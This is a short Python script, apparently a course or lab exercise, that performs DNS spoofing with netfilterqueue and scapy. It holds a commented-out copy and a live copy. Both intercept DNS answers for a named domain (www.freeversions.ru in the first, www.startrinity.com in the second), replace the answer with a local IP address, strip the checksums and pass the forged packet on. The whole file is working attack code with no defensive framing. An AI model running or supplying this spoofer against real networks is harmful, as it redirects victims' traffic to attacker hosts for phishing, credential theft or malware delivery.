# import netfilterqueue
# import scapy.all as scapy

# def process_packet(packet):
#     scapy_packet=scapy.IP(packet.get_payload())
#     if scapy_packet.haslayer(scapy.DNSRR):
#         qname=scapy_packet[scapy.DNSQR].qname
#         if "www.freeversions.ru" in qname.decode():
#             print("-----------")
#             print("[+] Spoofing target...")

#             answer=scapy.DNSRR(rrname=qname,rdata="192.168.0.171")
#             scapy_packet[scapy.DNS].an = answer
#             scapy_packet[scapy.DNS].ancount = 1
            
#             del scapy_packet[scapy.IP].len
#             del scapy_packet[scapy.IP].chksum
#             del scapy_packet[scapy.UDP].chksum
#             del scapy_packet[scapy.UDP].len

#             packet.set_payload(bytes(scapy_packet))

#     packet.accept()
        
# queue=netfilterqueue.NetfilterQueue()
# queue.bind(0,process_packet)
# queue.run()



import netfilterqueue
import scapy.all as scapy

def process_packet(packet):
    scapy_packet=scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname=scapy_packet[scapy.DNSQR].qname
        if "www.startrinity.com" in qname.decode():
            print("[+] Spoofing target...")

            answer=scapy.DNSRR(rrname=qname,rdata="192.168.0.108")
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1
            
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].chksum
            del scapy_packet[scapy.UDP].len

            packet.set_payload(bytes(scapy_packet))

    packet.accept()
        
queue=netfilterqueue.NetfilterQueue()
queue.bind(0,process_packet)
queue.run()
